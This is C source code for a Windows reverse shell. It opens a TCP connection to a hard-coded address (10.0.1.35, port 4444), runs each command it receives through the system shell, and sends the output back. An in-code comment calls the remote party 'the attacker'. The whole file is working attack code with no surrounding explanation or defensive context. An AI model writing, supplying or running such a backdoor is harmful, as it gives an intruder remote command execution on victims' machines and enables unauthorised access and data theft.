#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 4444
#define IP "10.0.1.35"  // Change to the actual IP of the server

void init_socket() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
}

int main() {
    SOCKET sock;
    struct sockaddr_in server;
    char *command;
    FILE *fp;

    init_socket();

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection failed\n");
        return 1;
    }

    while (1) {
        char buffer[1024];

        // Receive the command from the server
        memset(buffer, 0, sizeof(buffer));
        recv(sock, buffer, sizeof(buffer), 0);

        // Execute the command
        fp = _popen(buffer, "r");
        if (fp == NULL) {
            send(sock, "Failed to execute command\n", 25, 0);
            continue;
        }

        // Send the command output back to the attacker
        while (fgets(buffer, sizeof(buffer), fp)) {
            send(sock, buffer, strlen(buffer), 0);
        }

        fclose(fp);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
